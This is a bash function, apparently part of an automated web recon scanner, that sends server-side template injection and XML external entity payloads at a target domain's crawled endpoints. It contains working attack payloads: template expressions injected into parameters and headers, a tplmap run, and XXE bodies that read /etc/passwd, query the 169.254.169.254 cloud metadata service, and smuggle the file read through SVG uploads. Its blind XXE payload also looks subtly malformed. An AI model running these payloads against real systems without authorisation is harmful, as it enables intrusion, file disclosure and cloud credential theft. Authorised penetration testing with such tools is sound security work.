#!/bin/bash
# Server-Side Template Injection (SSTI) and XXE detection, payload crafting, blind XXE detection

ssti_xxe_phase() {
    local domain="$1"
    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    local ssti_dir="$output_dir/ssti_xxe"
    local crawl_file="$output_dir/crawl/endpoints.txt"
    local params_file="$output_dir/crawl/urls_with_params.txt"

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true
    mkdir -p "$ssti_dir"

    log "INFO" "Starting SSTI/XXE testing for $domain"
    py_log "INFO" "ssti_xxe_phase started" --phase "ssti_xxe" --target "$domain" || true

    local ssti_vulns="$ssti_dir/ssti_vulns.txt"
    local xxe_vulns="$ssti_dir/xxe_vulns.txt"
    touch "$ssti_vulns" "$xxe_vulns"

    # ------------------------------------------------------------------
    # 1. SSTI detection via parameter reflection
    # ------------------------------------------------------------------
    if [ -f "$params_file" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing SSTI with detection payloads..."

        # Detection payloads that produce predictable output
        local detection_marker="SSTI_DETECTION_$(date +%s)"
        local ssti_payloads_file="$ssti_dir/ssti_payloads.txt"
        cat > "$ssti_payloads_file" << 'SSTIPAYLOADS'
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
#{ 7*7 }
{{= 7*7}}
{$= 7*7}
SSTIPAYLOADS

        while IFS= read -r endpoint; do
            [ -z "$endpoint" ] && continue
            if [[ "$endpoint" == *"?"* ]]; then
                local base="${endpoint%\?*}"
                local query="${endpoint#*\?}"
                IFS='&' read -ra PARAMS <<< "$query"
                for param in "${PARAMS[@]}"; do
                    local key="${param%=*}"
                    while IFS= read -r payload; do
                        [ -z "$payload" ] && continue
                        local encoded
                        encoded=$(printf '%s' "$payload" | jq -sRr @uri 2>/dev/null) || continue
                        local test_url="${base}?${key}=${encoded}"
                        local resp
                        resp=$(curl -s --max-time 10 "$test_url" 2>/dev/null) || true
                        if echo "$resp" | grep -q "49"; then
                            echo "SSTI_HIT: $test_url | Payload: $payload | Response contains 49" >> "$ssti_vulns"
                            write_finding "{\"type\":\"ssti_detected\",\"url\":\"$test_url\",\"payload\":\"$payload\",\"severity\":\"critical\",\"domain\":\"$domain\"}" "$ssti_dir/findings.json" || true
                        fi
                    done < "$ssti_payloads_file"
                done
            fi
        done < <(head -40 "$params_file")
    fi

    # ------------------------------------------------------------------
    # 2. SSTI with tplmap
    # ------------------------------------------------------------------
    if [ -f "$params_file" ] && tool_available "tplmap"; then
        log "INFO" "Running tplmap for advanced SSTI detection..."
        tplmap -m "$params_file" --run-all --threads "$THREADS" \
            --output-dir "$ssti_dir/tplmap" \
            2>>"$LOGS_DIR/tplmap.log" || true
    fi

    # ------------------------------------------------------------------
    # 3. SSTI in headers and cookie values
    # ------------------------------------------------------------------
    if [ -f "$params_file" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing SSTI in headers..."
        local header_ssti_payloads
        header_ssti_payloads='{{7*7}}|{{7*7}}'

        while IFS= read -r endpoint; do
            [ -z "$endpoint" ] && continue
            local base="${endpoint%%\?*}"
            for hdr in "User-Agent" "Referer" "X-Forwarded-For" "X-Custom-Header"; do
                local code
                code=$(curl -s -o "$ssti_dir/_hdr_resp.tmp" -w "%{http_code}" \
                    -H "${hdr}: ${header_ssti_payloads%%|*}" \
                    --max-time 10 "$base" 2>/dev/null) || true
                if echo "$code" | grep -qE "^(200|201)$"; then
                    if grep -q "49" "$ssti_dir/_hdr_resp.tmp" 2>/dev/null; then
                        echo "SSTI_HEADER: $base | Header: $hdr | Payload reflected as 49" >> "$ssti_vulns"
                    fi
                fi
            done
        done < <(head -20 "$params_file")
    fi

    # ------------------------------------------------------------------
    # 4. XXE detection via XML body injection
    # ------------------------------------------------------------------
    if [ -f "$params_file" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing XXE via XML request bodies..."

        # Standard XXE payloads
        cat > "$ssti_dir/xxe_payloads.xml" << 'XXEFILE'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
XXEFILE

        cat > "$ssti_dir/xxe_blind_payloads.xml" << 'XXEBLIND'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
XXEBLIND

        while IFS= read -r endpoint; do
            [ -z "$endpoint" ] && continue
            local post_url="${endpoint%%\?*}"

            # Test standard XXE
            local code
            code=$(curl -s -o "$ssti_dir/_xxe_resp.tmp" -w "%{http_code}" \
                -X POST -H "Content-Type: application/xml" \
                -d @"$ssti_dir/xxe_payloads.xml" \
                --max-time 15 "$post_url" 2>/dev/null) || true
            if echo "$code" | grep -qE "^(200|201)$"; then
                if grep -q "root:" "$ssti_dir/_xxe_resp.tmp" 2>/dev/null; then
                    echo "XXE_FILE_READ: $post_url | /etc/passwd exfiltrated" >> "$xxe_vulns"
                    write_finding "{\"type\":\"xxe_file_read\",\"url\":\"$post_url\",\"severity\":\"critical\",\"domain\":\"$domain\"}" "$ssti_dir/findings.json" || true
                fi
            fi

            # Test blind XXE with parameter entities
            local blind_payload
            blind_payload='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY callhome "%xxe;">]><root>&callhome;</root>'
            local code2
            code2=$(curl -s -o /dev/null -w "%{http_code}" \
                -X POST -H "Content-Type: application/xml" \
                -d "$blind_payload" \
                --max-time 15 "$post_url" 2>/dev/null) || true
            if echo "$code2" | grep -qE "^(200|201|500)$"; then
                echo "XXE_BLIND_CANDIDATE: $post_url | Server processed parameter entity" >> "$xxe_vulns"
            fi
        done < <(head -30 "$params_file")
    fi

    # ------------------------------------------------------------------
    # 5. XXE via SVG upload and Content-Type switching
    # ------------------------------------------------------------------
    if [ -f "$params_file" ] && command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing XXE via SVG and Content-Type switching..."
        local svg_xxe='<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'

        while IFS= read -r endpoint; do
            [ -z "$endpoint" ] && continue
            local post_url="${endpoint%%\?*}"
            # Try submitting SVG as image upload
            local code
            code=$(curl -s -o "$ssti_dir/_svg_resp.tmp" -w "%{http_code}" \
                -X POST -H "Content-Type: image/svg+xml" \
                -d "$svg_xxe" \
                --max-time 15 "$post_url" 2>/dev/null) || true
            if echo "$code" | grep -qE "^(200|201)$"; then
                if grep -q "root:" "$ssti_dir/_svg_resp.tmp" 2>/dev/null; then
                    echo "XXE_SVG_UPLOAD: $post_url | SVG XXE successful" >> "$xxe_vulns"
                fi
            fi
        done < <(head -15 "$params_file")
    fi

    # ------------------------------------------------------------------
    # 6. Summary count
    # ------------------------------------------------------------------
    local total_vulns
    total_vulns=$(( $(wc -l < "$ssti_vulns" 2>/dev/null || echo 0) \
                 + $(wc -l < "$xxe_vulns" 2>/dev/null || echo 0) ))
    log "INFO" "SSTI/XXE testing complete: $total_vulns vulnerabilities found"

    py_log "INFO" "ssti_xxe_phase complete" --phase "ssti_xxe" --target "$domain" --extra "{\"vulns\":$total_vulns}" || true
    echo "$total_vulns" > "$ssti_dir/count.txt"
}

export -f ssti_xxe_phase
